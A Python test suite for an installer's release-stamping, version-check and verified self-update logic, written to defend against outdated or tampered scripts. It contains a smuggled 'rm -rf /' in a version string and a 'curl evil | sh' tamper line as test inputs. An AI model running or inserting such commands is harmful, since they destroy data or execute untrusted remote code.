# Copyright (c) 2026-present Maciej Szymczak and contributors
# SPDX-License-Identifier: AGPL-3.0-only
# See the LICENSE file for details.

"""S29: an installer refuses to upgrade to a release that ships a newer copy of itself.

`setup.sh` (Compose) and `swarm.sh` (Swarm) fetch a release's deployment
files on install and upgrade, never a newer copy of the script. Up to
hangar-v0.3.0 nothing told the operator, so an upgrade to hangar-v0.3.0 run
with the hangar-v0.2.2 script installed the new images and skipped the
script's own fix (`plane.env` stayed `664`, S28).

The release workflow now stamps each published script with its release
(`release_evidence.py stamp-scripts`). install and upgrade (Swarm: deploy and
upgrade) refuse a release newer than that, with the commands that fetch and
verify the new script, unless HANGAR_ALLOW_OLD_SCRIPT=1 or --allow-old-script;
the same or an older release (a rollback) goes ahead, and an unstamped script
from a branch or a checkout behaves as before. start, stop and restart only
warn. `update-script` replaces the script with the verified one of a release
and does not run it.

The Compose tests run a stamped copy of `install.sh` end to end against a
scratch install directory with Docker replaced, as
test_installer_env_permissions.py does. The Swarm tests and the update-script
tests run the scripts' functions, the latter against a release served over
HTTP by test_installer_release_verification.py's scratch server.
"""

from __future__ import annotations

import os
import re
import shutil
import stat
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

import test_installer_release_verification as verification  # noqa: E402

release_evidence = verification.release_evidence

REPOSITORY_ROOT = Path(__file__).resolve().parents[3]
COMMUNITY = REPOSITORY_ROOT / "deployments" / "cli" / "community"
INSTALL = COMMUNITY / "install.sh"
SWARM = REPOSITORY_ROOT / "deployments" / "swarm" / "community" / "swarm.sh"
SCRIPTS = (INSTALL, SWARM)
WORKFLOW = REPOSITORY_ROOT / ".github" / "workflows" / "build-branch.yml"

SHARED_FUNCTIONS = (
    "compareReleases",
    "scriptIsOutdatedFor",
    "printScriptUpdateSteps",
    "checkScriptRelease",
    "warnScriptRelease",
    "fileOwner",
    "updateScript",
)
CHECK_FUNCTIONS = ("compareReleases", "scriptIsOutdatedFor", "printScriptUpdateSteps", "checkScriptRelease")
IDENTITY_PREFIX = "https://github.com/szymczag/hangar/.github/workflows/build-branch.yml@refs/tags/"

# Records every call, and answers the ones install, upgrade and stop make:
# the images are published for this architecture and no volume exists.
FAKE_DOCKER = """#!/usr/bin/env bash
printf '%s\\n' "$*" >> "$DOCKER_LOG"
case "$1 $2" in
    "manifest inspect") printf '"architecture": "amd64"\\n"architecture": "arm64"\\n'; exit 0 ;;
    "volume inspect") exit 1 ;;
    "volume ls") exit 0 ;;
esac
exit 0
"""


def _function(source: str, name: str, script: Path) -> str:
    return verification._function(source, name, script)


def _functions(script: Path, names: tuple) -> str:
    source = script.read_text()
    return "\n".join(_function(source, name, script) for name in names) + "\n"


def _stamped(script: Path, version: str) -> str:
    return release_evidence.stamp_script_release(script.read_text(), version=version)


def _env(path: Path) -> dict:
    values = {}
    for line in path.read_text().splitlines():
        if "=" in line and not line.startswith("#"):
            key, value = line.split("=", 1)
            values[key] = value
    return values


class StampTests(unittest.TestCase):
    """The release workflow writes the release into the published scripts."""

    def test_each_source_script_carries_the_placeholder_once(self):
        for script in SCRIPTS:
            with self.subTest(script=script.name):
                source = script.read_text()
                self.assertEqual(re.findall(r"^SCRIPT_RELEASE=.*$", source, re.MULTILINE), ["SCRIPT_RELEASE=unreleased"])
                asset = "setup.sh" if script == INSTALL else "swarm.sh"
                self.assertIn(f"\nSCRIPT_ASSET={asset}\n", source)
                self.assertIn("\nSCRIPT_PATH=${BASH_SOURCE[0]:-$SCRIPT_ASSET}\n", source)

    def test_stamping_replaces_only_the_placeholder(self):
        for script in SCRIPTS:
            with self.subTest(script=script.name):
                source = script.read_text()
                stamped = _stamped(script, "v1.2.3-rc.4")
                self.assertEqual(stamped, source.replace("\nSCRIPT_RELEASE=unreleased\n", "\nSCRIPT_RELEASE=v1.2.3-rc.4\n"))
                self.assertNotEqual(stamped, source)

    def test_a_script_already_stamped_or_without_the_placeholder_fails_the_release(self):
        stamped = _stamped(INSTALL, "v1.0.0")
        for text in (stamped, "#!/bin/bash\necho hi\n", "SCRIPT_RELEASE=unreleased\nSCRIPT_RELEASE=unreleased\n"):
            with self.subTest(text=text[:40]):
                with self.assertRaises(release_evidence.EvidenceError):
                    release_evidence.stamp_script_release(text, version="v1.0.1")
        with self.assertRaises(release_evidence.EvidenceError):
            release_evidence.stamp_script_release(INSTALL.read_text(), version="v1.0.0; rm -rf /")

    def test_the_command_stamps_the_published_assets_with_the_tag_version(self):
        with tempfile.TemporaryDirectory() as scratch:
            assets = Path(scratch)
            shutil.copy(INSTALL, assets / "setup.sh")
            shutil.copy(SWARM, assets / "swarm.sh")
            code = release_evidence.main(
                ["stamp-scripts", "--git-tag", "hangar-v0.4.0-rc.2", str(assets / "setup.sh"), str(assets / "swarm.sh")]
            )
            self.assertEqual(code, 0)
            for name in ("setup.sh", "swarm.sh"):
                with self.subTest(asset=name):
                    text = (assets / name).read_text()
                    self.assertIn("\nSCRIPT_RELEASE=v0.4.0-rc.2\n", text)
                    self.assertNotIn("SCRIPT_RELEASE=unreleased", text)
            # SHA256SUMS, written after the stamping, lists the stamped files.
            sums = release_evidence.collect_checksums(assets)
            self.assertEqual(sums["setup.sh"], release_evidence.sha256_file(assets / "setup.sh"))
            # Stamping twice fails rather than publishing an ambiguous identity.
            self.assertEqual(
                release_evidence.main(["stamp-scripts", "--git-tag", "hangar-v0.4.0", str(assets / "setup.sh")]), 1
            )
            self.assertEqual(release_evidence.main(["stamp-scripts", "--git-tag", "v0.4.0", str(assets / "swarm.sh")]), 1)

    def test_the_release_job_stamps_both_scripts_before_the_checksums(self):
        workflow = WORKFLOW.read_text()
        release = workflow.split("\n  release:\n", maxsplit=1)[1]
        stage = release.split("      - name: Stage release assets\n", maxsplit=1)[1].split("      - name: ", maxsplit=1)[0]
        command = (
            "python3 .github/scripts/release_evidence.py stamp-scripts \\\n"
            '            --git-tag "$GIT_TAG" \\\n'
            "            release-assets/setup.sh release-assets/swarm.sh\n"
        )
        self.assertIn(command, stage)
        self.assertLess(stage.index("cp deployments/cli/community/install.sh release-assets/setup.sh"), stage.index(command))
        self.assertLess(stage.index("cp deployments/swarm/community/swarm.sh release-assets/"), stage.index(command))
        self.assertLess(release.index("stamp-scripts"), release.index("release_evidence.py checksums"))
        self.assertEqual(workflow.count("stamp-scripts"), 1)


class CompareReleasesTests(unittest.TestCase):
    CASES = (
        ("v1.0.0", "v1.0.0", "0"),
        ("v1.0.1", "v1.0.0", "1"),
        ("v1.0.0", "v1.0.1", "-1"),
        ("v0.10.0", "v0.9.9", "1"),
        ("v1.0.0", "v0.99.99", "1"),
        ("v0.08.0", "v0.8.0", "0"),
        ("1.2.3", "v1.2.3", "0"),
        ("v1.0.0-rc.1", "v1.0.0", "-1"),
        ("v1.0.0", "v1.0.0-rc.1", "1"),
        ("v1.0.0-rc.2", "v1.0.0-rc.10", "-1"),
        ("v1.0.0-alpha.3", "v1.0.0-beta.1", "-1"),
        ("v1.0.0-rc.1", "v1.0.0-beta.9", "1"),
        ("v1.0.0-rc", "v1.0.0-rc.1", "-1"),
        ("v1.0.0-rc.1", "v0.9.0", "1"),
        ("v1.0.0-rc.1", "v1.0.0-rc.1", "0"),
    )
    INVALID = (("stable", "v1.0.0"), ("v1.0.0", "unreleased"), ("local", "local"), ("v1.0", "v1.0.0"), ("", "v1.0.0"))

    def _compare(self, left: str, right: str) -> subprocess.CompletedProcess:
        return subprocess.run(
            ["bash", "-c", _functions(INSTALL, ("compareReleases",)) + 'compareReleases "$1" "$2"', "-", left, right],
            capture_output=True,
            text=True,
            check=False,
            env={"PATH": "/usr/bin:/bin"},
        )

    def test_versions_are_ordered_as_semantic_versions(self):
        for left, right, expected in self.CASES:
            with self.subTest(left=left, right=right):
                result = self._compare(left, right)
                self.assertEqual(result.returncode, 0, result.stderr)
                self.assertEqual(result.stdout.strip(), expected)
                self.assertEqual(result.stderr, "")

    def test_anything_else_is_not_compared(self):
        for left, right in self.INVALID:
            with self.subTest(left=left, right=right):
                result = self._compare(left, right)
                self.assertEqual(result.returncode, 1)
                self.assertEqual(result.stdout, "")


class ComposeScratch:
    """An install from an earlier release, and a copy of setup.sh to run on it."""

    def __init__(self, cleanup, *, script_release: str | None, installed: str | None = "v0.0.1"):
        self.root = Path(tempfile.mkdtemp())
        cleanup(shutil.rmtree, self.root, True)
        self.install_dir = self.root / "plane-app"
        (self.install_dir / "archive").mkdir(parents=True)
        self.env = self.install_dir / "plane.env"
        if installed is not None:
            lines = (COMMUNITY / "variables.env").read_text().splitlines()
            keys = ("APP_RELEASE=", "WEB_URL=", "PULL_POLICY=", "CUSTOM_BUILD=")
            lines = [line for line in lines if not line.startswith(keys)]
            # Every setting the script fills in when it is missing, so a
            # refused run can be shown to leave plane.env byte for byte.
            lines += [
                f"APP_RELEASE={installed}",
                "WEB_URL=https://hangar.example.com",
                "PULL_POLICY=if_not_present",
                "CUSTOM_BUILD=false",
            ]
            self.env.write_text("\n".join(lines) + "\n")
            self.env.chmod(0o600)
            (self.install_dir / "docker-compose.yaml").write_text("# the previous compose file\n")
        self.script = self.root / "setup.sh"
        self.script.write_text(INSTALL.read_text() if script_release is None else _stamped(INSTALL, script_release))
        self.script.chmod(0o755)
        self.bin = self.root / "bin"
        self.bin.mkdir()
        for name in ("docker", "docker-compose"):
            fake = self.bin / name
            fake.write_text(FAKE_DOCKER)
            fake.chmod(0o755)
        self.docker_log = self.root / "docker.log"

    def snapshot(self) -> dict:
        return verification._snapshot(self.install_dir)

    def docker_calls(self) -> list:
        return self.docker_log.read_text().splitlines() if self.docker_log.exists() else []

    def run(self, *arguments: str, target: str = "v1.1.0", extra_env: dict | None = None) -> subprocess.CompletedProcess:
        environment = {
            "PATH": f"{self.bin}:/usr/bin:/bin",
            "HOME": str(self.root),
            "HANGAR_ASSUME_YES": "1",
            "HANGAR_INSTALL_SOURCE_DIR": str(COMMUNITY),
            "HANGAR_RELEASE": target,
            "DOCKER_LOG": str(self.docker_log),
            **(extra_env or {}),
        }
        result = subprocess.run(
            ["bash", "./setup.sh", *arguments],
            cwd=self.root,
            env=environment,
            stdin=subprocess.DEVNULL,
            capture_output=True,
            text=True,
            timeout=120,
            check=False,
        )
        result.output = result.stdout + result.stderr
        return result


class ComposeUpgradeTests(unittest.TestCase):
    """`setup.sh --yes upgrade` from v0.0.1, run end to end with Docker replaced."""

    def assertRefused(self, scratch: ComposeScratch, result, before: dict, *, script: str, target: str, action: str):
        self.assertEqual(result.returncode, 1, result.output)
        self.assertIn(
            f"ERROR: this setup.sh is from release hangar-{script}, and hangar-{target} ships a newer setup.sh.",
            result.stderr,
        )
        base = f"https://github.com/szymczag/hangar/releases/download/hangar-{target}"
        self.assertIn(f"curl -fsSL -O {base}/setup.sh -O {base}/SHA256SUMS -O {base}/SHA256SUMS.sigstore.json", result.stderr)
        self.assertIn(f"--certificate-identity {IDENTITY_PREFIX}hangar-{target}", result.stderr)
        self.assertIn("--certificate-oidc-issuer https://token.actions.githubusercontent.com SHA256SUMS", result.stderr)
        self.assertIn("sha256sum --check --ignore-missing SHA256SUMS", result.stderr)
        self.assertIn(f"cp hangar-{target}/setup.sh ./setup.sh && chmod 755 ./setup.sh", result.stderr)
        self.assertIn("'./setup.sh update-script'", result.stderr)
        self.assertIn(f"To {action} with this script anyway, set HANGAR_ALLOW_OLD_SCRIPT=1", result.stderr)
        self.assertIn("--allow-old-script). Nothing has been changed.", result.stderr)
        # Refused before anything was fetched, stopped or rewritten.
        self.assertEqual(scratch.snapshot(), before)
        self.assertEqual(scratch.docker_calls(), [])
        self.assertNotIn("Using the deployment files", result.stdout)

    def assertUpgraded(self, scratch: ComposeScratch, result, target: str):
        self.assertEqual(result.returncode, 0, result.output)
        self.assertIn("PLEASE VALIDATE AND START SERVICES", result.stdout)
        self.assertEqual(_env(scratch.env)["APP_RELEASE"], target)
        self.assertTrue(any(call.endswith(" down") for call in scratch.docker_calls()), scratch.docker_calls())

    def test_an_older_script_refuses_to_upgrade_to_a_newer_release(self):
        scratch = ComposeScratch(self.addCleanup, script_release="v1.0.0")
        before = scratch.snapshot()
        result = scratch.run("--yes", "upgrade", target="v1.1.0")
        self.assertRefused(scratch, result, before, script="v1.0.0", target="v1.1.0", action="upgrade")

    def test_the_release_tag_form_of_the_target_is_refused_too(self):
        scratch = ComposeScratch(self.addCleanup, script_release="v1.0.0")
        before = scratch.snapshot()
        result = scratch.run("--yes", "upgrade", target="hangar-v1.1.0")
        self.assertRefused(scratch, result, before, script="v1.0.0", target="v1.1.0", action="upgrade")

    def test_the_override_lets_the_older_script_upgrade(self):
        for how in ("env", "flag"):
            with self.subTest(override=how):
                scratch = ComposeScratch(self.addCleanup, script_release="v1.0.0")
                if how == "env":
                    result = scratch.run("--yes", "upgrade", extra_env={"HANGAR_ALLOW_OLD_SCRIPT": "1"})
                else:
                    result = scratch.run("upgrade", "--allow-old-script", "--yes")
                self.assertUpgraded(scratch, result, "v1.1.0")
                warnings = [line for line in result.stderr.splitlines() if "HANGAR_ALLOW_OLD_SCRIPT=1" in line]
                self.assertEqual(len(warnings), 1, result.stderr)
                self.assertTrue(warnings[0].startswith("WARNING: this setup.sh is from hangar-v1.0.0"), warnings[0])
                self.assertNotIn("ERROR", result.stderr)

    def test_the_script_of_the_target_release_upgrades(self):
        scratch = ComposeScratch(self.addCleanup, script_release="v1.1.0")
        result = scratch.run("--yes", "upgrade", target="v1.1.0")
        self.assertUpgraded(scratch, result, "v1.1.0")
        self.assertNotIn("setup.sh is from", result.output)

    def test_a_newer_script_rolls_back_to_an_older_release(self):
        scratch = ComposeScratch(self.addCleanup, script_release="v1.2.0")
        result = scratch.run("--yes", "upgrade", target="v1.1.0")
        self.assertUpgraded(scratch, result, "v1.1.0")
        self.assertNotIn("setup.sh is from", result.output)

    def test_pre_releases_order_before_their_release(self):
        refused = ComposeScratch(self.addCleanup, script_release="v1.1.0-rc.1")
        before = refused.snapshot()
        result = refused.run("--yes", "upgrade", target="v1.1.0")
        self.assertRefused(refused, result, before, script="v1.1.0-rc.1", target="v1.1.0", action="upgrade")

        allowed = ComposeScratch(self.addCleanup, script_release="v1.1.0")
        self.assertUpgraded(allowed, allowed.run("--yes", "upgrade", target="v1.1.0-rc.2"), "v1.1.0-rc.2")

    def test_an_unstamped_script_upgrades_as_before(self):
        scratch = ComposeScratch(self.addCleanup, script_release=None)
        result = scratch.run("--yes", "upgrade", target="v9.9.9")
        self.assertUpgraded(scratch, result, "v9.9.9")
        self.assertNotIn("setup.sh is from", result.output)
        self.assertNotIn("HANGAR_ALLOW_OLD_SCRIPT", result.output)

    def test_an_install_of_a_newer_release_is_refused(self):
        scratch = ComposeScratch(self.addCleanup, script_release="v1.0.0", installed=None)
        before = scratch.snapshot()
        result = scratch.run("--yes", "install", target="v1.1.0")
        self.assertRefused(scratch, result, before, script="v1.0.0", target="v1.1.0", action="install")
        self.assertFalse(scratch.env.exists())

        same = ComposeScratch(self.addCleanup, script_release="v1.1.0", installed=None)
        result = same.run("--yes", "install", target="v1.1.0")
        self.assertEqual(result.returncode, 0, result.output)
        self.assertEqual(_env(same.env)["APP_RELEASE"], "v1.1.0")

    def test_stop_only_warns(self):
        scratch = ComposeScratch(self.addCleanup, script_release="v1.0.0", installed="v1.1.0")
        result = scratch.run("stop")
        self.assertEqual(result.returncode, 0, result.output)
        self.assertIn(
            "WARNING: this setup.sh is from hangar-v1.0.0, but the deployment runs hangar-v1.1.0, which ships a newer one.",
            result.stderr,
        )
        self.assertIn("Run './setup.sh update-script'", result.stderr)
        self.assertTrue(any(call.endswith(" down") for call in scratch.docker_calls()), scratch.docker_calls())

        current = ComposeScratch(self.addCleanup, script_release="v1.1.0", installed="v1.1.0")
        result = current.run("stop")
        self.assertEqual(result.returncode, 0, result.output)
        self.assertNotIn("WARNING: this setup.sh", result.stderr)

    def test_an_installed_release_newer_than_the_script_is_reported_when_nothing_is_upgraded(self):
        scratch = ComposeScratch(self.addCleanup, script_release="v1.0.0", installed="v1.1.0")
        result = scratch.run("--yes", "upgrade", target="v1.1.0")
        self.assertEqual(result.returncode, 0, result.output)
        self.assertIn("You are already using the latest release", result.stdout)
        self.assertIn("WARNING: this setup.sh is from hangar-v1.0.0, but the deployment runs hangar-v1.1.0", result.stderr)


class SwarmTests(unittest.TestCase):
    """`swarm.sh` makes the same check on deploy and upgrade."""

    def test_an_older_script_refuses_to_upgrade_end_to_end(self):
        root = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, root, True)
        install_dir = root / "plane-app"
        (install_dir / "archive").mkdir(parents=True)
        env = install_dir / "plane.env"
        env.write_text("STACK_NAME=plane\nAPP_RELEASE=v0.0.1\nDOCKERHUB_USER=ghcr.io/szymczag\n")
        env.chmod(0o600)
        script = root / "setup.sh"
        script.write_text(_stamped(SWARM, "v1.0.0"))
        bin_dir = root / "bin"
        bin_dir.mkdir()
        (bin_dir / "docker").write_text(FAKE_DOCKER)
        (bin_dir / "docker").chmod(0o755)
        before = verification._snapshot(install_dir)
        result = subprocess.run(
            ["bash", "./setup.sh", "--yes", "upgrade"],
            cwd=root,
            env={
                "PATH": f"{bin_dir}:/usr/bin:/bin",
                "HOME": str(root),
                "HANGAR_RELEASE": "v1.1.0",
                "DOCKER_LOG": str(root / "docker.log"),
            },
            stdin=subprocess.DEVNULL,
            capture_output=True,
            text=True,
            timeout=60,
            check=False,
        )
        self.assertEqual(result.returncode, 1, result.stdout + result.stderr)
        self.assertIn("ERROR: this swarm.sh is from release hangar-v1.0.0, and hangar-v1.1.0 ships a newer swarm.sh.", result.stderr)
        self.assertIn("releases/download/hangar-v1.1.0/swarm.sh", result.stderr)
        self.assertIn("cp hangar-v1.1.0/swarm.sh ./setup.sh", result.stderr)
        self.assertEqual(verification._snapshot(install_dir), before)
        self.assertFalse((root / "docker.log").exists())

    def _run(self, function: str, *, script_release: str, target: str, allow: str = "0", installed: str = "v0.0.1"):
        stubs = (
            "function checkLatestRelease() { echo ASKED-GITHUB; exit 1; }\n"
            "function checkSecretKeyRotation() { :; }\n"
            "function copyEnvFile() { :; }\n"
            'function download() { echo "DOWNLOADED $APP_RELEASE"; }\n'
            "function removeStack() { :; }\n"
            "function redeployStack() { echo REDEPLOYED; }\n"
            "function getStackName() { stack_name=plane; }\n"
            "function writeStackFile() { return 1; }\n"
            "function docker() { return 1; }\n"
        )
        program = (
            _functions(SWARM, CHECK_FUNCTIONS + (function,))
            + stubs
            + f"stack_name=plane\nAPP_RELEASE={installed}\n{function}\n"
        )
        with tempfile.TemporaryDirectory() as scratch:
            return subprocess.run(
                ["bash", "-c", program],
                capture_output=True,
                text=True,
                stdin=subprocess.DEVNULL,
                check=False,
                env={
                    "PATH": "/usr/bin:/bin",
                    "HANGAR_ASSUME_YES": "1",
                    "HANGAR_RELEASE": target,
                    "HANGAR_ALLOW_OLD_SCRIPT": allow,
                    "SCRIPT_RELEASE": script_release,
                    "SCRIPT_ASSET": "swarm.sh",
                    "SCRIPT_PATH": "./setup.sh",
                    "RELEASE_DOWNLOAD_URL": "https://github.com/szymczag/hangar/releases/download",
                    "DOCKER_FILE_PATH": f"{scratch}/docker-compose.yml",
                    "DOCKER_ENV_PATH": f"{scratch}/plane.env",
                },
            )

    def test_upgrade_refuses_a_newer_release_and_allows_the_rest(self):
        cases = (
            ("v1.0.0", "v1.1.0", "0", False),
            ("v1.0.0", "v1.1.0", "1", True),
            ("v1.1.0", "v1.1.0", "0", True),
            ("v1.2.0", "v1.1.0", "0", True),
            ("unreleased", "v1.1.0", "0", True),
        )
        for script_release, target, allow, proceeds in cases:
            with self.subTest(script=script_release, target=target, allow=allow):
                result = self._run("upgrade", script_release=script_release, target=target, allow=allow)
                self.assertEqual("DOWNLOADED v1.1.0" in result.stdout, proceeds, result.stdout + result.stderr)
                self.assertEqual(result.returncode == 0, proceeds, result.stderr)
                self.assertEqual("ships a newer swarm.sh" in result.stderr, not proceeds, result.stderr)
                self.assertNotIn("ASKED-GITHUB", result.stdout)

    def test_a_first_deploy_refuses_a_newer_release(self):
        refused = self._run("deployStack", script_release="v1.0.0", target="v1.1.0")
        self.assertEqual(refused.returncode, 1)
        self.assertNotIn("DOWNLOADED", refused.stdout)
        self.assertIn("To deploy with this script anyway", refused.stderr)
        allowed = self._run("deployStack", script_release="v1.1.0", target="v1.1.0")
        self.assertIn("DOWNLOADED v1.1.0", allowed.stdout)


class WiringTests(unittest.TestCase):
    def test_both_installers_share_the_check(self):
        install = INSTALL.read_text()
        swarm = SWARM.read_text()
        for name in SHARED_FUNCTIONS:
            with self.subTest(function=name):
                self.assertEqual(_function(install, name, INSTALL), _function(swarm, name, SWARM))

    def test_upgrade_checks_before_it_asks_fetches_or_stops(self):
        for script in SCRIPTS:
            with self.subTest(script=script.name):
                upgrade = _function(script.read_text(), "upgrade", script)
                check = upgrade.index('checkScriptRelease "$latest_release" upgrade || exit 1')
                self.assertLess(upgrade.index("latest_release=${HANGAR_RELEASE#hangar-}"), check)
                self.assertLess(check, upgrade.index('if [ "$HANGAR_ASSUME_YES" == "1" ]'))
                self.assertLess(check, upgrade.index("export APP_RELEASE=$latest_release"))
                for later in ("stageDeploymentFiles", "stopServices", "copyEnvFile", "download"):
                    if later in upgrade:
                        self.assertLess(check, upgrade.index(later), later)

    def test_install_and_first_deploy_check_before_they_fetch(self):
        install = _function(INSTALL.read_text(), "install", INSTALL)
        check = install.index('checkScriptRelease "$APP_RELEASE" install || exit 1')
        self.assertLess(check, install.index("initialize"))
        self.assertLess(check, install.index('download "'))
        deploy = _function(SWARM.read_text(), "deployStack", SWARM)
        check = deploy.index('checkScriptRelease "$APP_RELEASE" deploy || exit 1')
        self.assertLess(check, deploy.index("        download\n"))

    def test_the_override_is_explicit(self):
        for script in SCRIPTS:
            with self.subTest(script=script.name):
                source = script.read_text()
                self.assertIn("\nHANGAR_ALLOW_OLD_SCRIPT=${HANGAR_ALLOW_OLD_SCRIPT:-0}\n", source)
                self.assertIn("--allow-old-script) HANGAR_ALLOW_OLD_SCRIPT=1 ;;", source)
                self.assertIn('[ "$HANGAR_ALLOW_OLD_SCRIPT" == "1" ]', _function(source, "checkScriptRelease", script))

    def test_no_script_runs_what_it_downloads(self):
        # update-script renames the verified file into place and stops; nothing
        # executes or sources a downloaded script.
        for script in SCRIPTS:
            with self.subTest(script=script.name):
                update = _function(script.read_text(), "updateScript", script)
                self.assertNotRegex(update, r"\b(exec|source|bash|sh)\s+\"?\$(staging|SCRIPT_PATH)")
                self.assertNotRegex(update, r"(^|\s)\.\s+\"?\$")
                self.assertIn('mv -f "$staging/$SCRIPT_ASSET" "$SCRIPT_PATH"', update)


class UpdateScriptTests(unittest.TestCase):
    """`update-script` against a release served over HTTP, with cosign replaced."""

    FUNCTIONS = ("compareReleases", "printScriptUpdateSteps", "fileOwner", "updateScript")

    @classmethod
    def setUpClass(cls):
        verification.setUpModule()

    @classmethod
    def tearDownClass(cls):
        verification.tearDownModule()

    def _case(self, *, served_release: str = verification.VERSION, script: Path = INSTALL):
        case = verification.ReleaseCase(self)
        asset = "setup.sh" if script == INSTALL else "swarm.sh"
        served = _stamped(script, served_release).encode()
        (case.release / asset).write_bytes(served)
        case.files[asset] = served
        case.write_checksums()
        for tool in ("dirname", "stat", "chown"):
            (case.bin / tool).symlink_to(shutil.which(tool))
        return case, served

    def _run(self, case, *, script: Path = INSTALL, script_release: str = "v9.9.0", target: str = verification.GIT_TAG,
             local: Path | None = None, **options):
        asset = "setup.sh" if script == INSTALL else "swarm.sh"
        if local is None:
            local = case.scratch / "local" / "setup.sh"
            local.parent.mkdir()
            local.write_text(_stamped(script, script_release) if script_release != "unreleased" else script.read_text())
            local.chmod(0o755)
        result = case.run(
            script,
            functions=self.FUNCTIONS,
            body="updateScript\necho EXIT=$?\n",
            extra_env={
                "SCRIPT_RELEASE": script_release,
                "SCRIPT_ASSET": asset,
                "SCRIPT_PATH": str(local),
                "HANGAR_RELEASE": target,
            },
            **options,
        )
        return result, local

    def _leftovers(self, local: Path) -> list:
        return [path.name for path in local.parent.iterdir() if path.name.startswith(".update-script.")]

    def test_a_verified_script_replaces_the_old_one_atomically_and_is_not_run(self):
        for script in SCRIPTS:
            with self.subTest(script=script.name):
                case, served = self._case(script=script)
                local = case.scratch / "local" / "setup.sh"
                local.parent.mkdir()
                local.write_text(_stamped(script, "v9.9.0"))
                local.chmod(0o700)
                old_inode = local.stat().st_ino
                result, _ = self._run(case, script=script, local=local)
                self.assertIn("EXIT=0", result.stdout, result.output)
                self.assertEqual(local.read_bytes(), served)
                self.assertEqual(stat.S_IMODE(local.stat().st_mode), 0o755)
                self.assertEqual(local.stat().st_uid, os.getuid())
                # Renamed into place: a new inode, never the old file rewritten.
                self.assertNotEqual(local.stat().st_ino, old_inode)
                self.assertEqual(self._leftovers(local), [])
                asset = "setup.sh" if script == INSTALL else "swarm.sh"
                self.assertIn(f"Verified {asset} against SHA256SUMS", result.stdout)
                self.assertIn("It has not been run", result.stdout)
                self.assertEqual(case.requested("releases")[0], f"/{case.name}/releases/download/{verification.GIT_TAG}/{asset}")
                staging = Path(result.cosign_args[2]).parent
                self.assertEqual(result.cosign_args, case.expected_cosign_args(str(staging)))
                self.assertEqual(staging.parent, local.parent)
                self.assertNotIn("Select a", result.output)

    def assertUntouched(self, result, local: Path, before: bytes, inode: int):
        self.assertNotIn("EXIT=0", result.stdout, result.output)
        self.assertEqual(local.read_bytes(), before)
        self.assertEqual(local.stat().st_ino, inode)
        self.assertEqual(self._leftovers(local), [])
        self.assertIn("has not been changed", result.stderr)

    def _untouched_after(self, case, **options):
        local = case.scratch / "local" / "setup.sh"
        local.parent.mkdir()
        local.write_text(_stamped(INSTALL, "v9.9.0"))
        local.chmod(0o755)
        before, inode = local.read_bytes(), local.stat().st_ino
        result, _ = self._run(case, local=local, **options)
        self.assertUntouched(result, local, before, inode)
        return result

    def test_a_signature_that_does_not_verify_leaves_the_old_script(self):
        case, _ = self._case()
        result = self._untouched_after(case, cosign_exit=1)
        self.assertIn("is not signed by", result.stderr)

    def test_a_script_that_does_not_match_the_checksums_leaves_the_old_script(self):
        case, _ = self._case()
        with (case.release / "setup.sh").open("ab") as tampered:
            tampered.write(b"curl evil | sh\n")
        result = self._untouched_after(case)
        self.assertIn("ERROR: setup.sh does not match SHA256SUMS", result.stderr)

    def test_without_cosign_the_signature_policy_applies(self):
        case, _ = self._case()
        self._untouched_after(case, cosign=False, require="1")

    def test_a_script_signed_for_another_release_is_refused(self):
        case, _ = self._case(served_release="v9.9.8")
        result = self._untouched_after(case)
        self.assertIn("does not say it is from that release", result.stderr)

    def test_a_missing_script_is_refused(self):
        case, _ = self._case()
        (case.release / "setup.sh").unlink()
        result = self._untouched_after(case)
        self.assertIn("could not be downloaded (HTTP 404)", result.stderr)

    def test_a_symbolic_link_is_not_replaced(self):
        case, _ = self._case()
        real = case.scratch / "real-setup.sh"
        real.write_text(_stamped(INSTALL, "v9.9.0"))
        link = case.scratch / "local" / "setup.sh"
        link.parent.mkdir()
        link.symlink_to(real)
        result, _ = self._run(case, local=link)
        self.assertNotIn("EXIT=0", result.stdout)
        self.assertTrue(link.is_symlink())
        self.assertIn("is not a regular file", result.stderr)
        self.assertIn(f"cp {verification.GIT_TAG}/setup.sh {link}", result.stderr)
        self.assertEqual(case.requested("releases"), [])

    def test_the_same_or_an_older_release_changes_nothing(self):
        for script_release in (verification.VERSION, "v10.0.0"):
            with self.subTest(script_release=script_release):
                case, _ = self._case()
                result, local = self._run(case, script_release=script_release)
                self.assertIn("EXIT=0", result.stdout, result.output)
                self.assertIn("Nothing has been changed", result.stdout)
                self.assertIn(f"SCRIPT_RELEASE={script_release}\n", local.read_text())
                self.assertEqual(case.requested("releases"), [])

    def test_an_unstamped_script_can_be_replaced(self):
        case, served = self._case()
        result, local = self._run(case, script_release="unreleased")
        self.assertIn("EXIT=0", result.stdout, result.output)
        self.assertEqual(local.read_bytes(), served)

    def test_a_release_without_checksums_is_refused(self):
        case, _ = self._case()
        result, local = self._run(case, script_release="unreleased", target="v0.1.0")
        self.assertNotIn("EXIT=0", result.stdout)
        self.assertIn("publishes no SHA256SUMS", result.stderr)
        self.assertEqual(local.read_text(), INSTALL.read_text())


if __name__ == "__main__":
    unittest.main()
